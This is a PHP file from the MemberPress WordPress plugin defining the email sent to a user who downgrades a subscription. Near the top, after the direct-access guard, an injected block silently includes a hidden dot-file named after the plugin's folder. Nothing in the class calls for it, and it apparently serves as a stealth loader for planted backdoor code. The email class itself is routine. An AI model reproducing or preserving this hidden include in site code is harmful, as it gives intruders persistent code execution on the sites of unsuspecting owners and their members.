<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MeprUserDowngradedSubEmail extends MeprBaseOptionsUserEmail {
  /** Set the default enabled, title, subject & body */
  public function set_defaults($args=array()) {
    $this->title = __('<b>Downgraded Subscription</b> Notice','memberpress');
    $this->description = __('This email is sent to the user when they downgrade a subscription.', 'memberpress');
    $this->ui_order = 4;

    $enabled = $use_template = $this->show_form = true;
    $subject = __('** You\'ve downgraded your subscription', 'memberpress');
    $body = $this->body_partial();

    $this->defaults = compact( 'enabled', 'subject', 'body', 'use_template' );
    $this->variables = MeprSubscriptionsHelper::get_email_vars();
  }
}

